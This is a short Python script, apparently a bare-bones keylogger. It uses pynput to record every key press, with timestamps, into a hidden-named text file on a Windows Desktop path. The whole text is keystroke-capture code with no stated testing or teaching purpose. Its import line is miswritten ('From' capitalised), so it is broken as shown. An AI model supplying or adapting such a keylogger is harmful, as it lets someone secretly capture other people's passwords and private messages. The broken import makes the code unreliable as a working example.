From pynput.keyboard import Listener
import os
import logging

n = os.getlogin()
dir = f"C:/Users/Yasmin/Desktop"

logging.basicConfig(filename=f"{dir}/tem.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s: ")


def kh(key):
    logging.info(key)

with Listener(on_press=kh) as listener:
    listener.join()
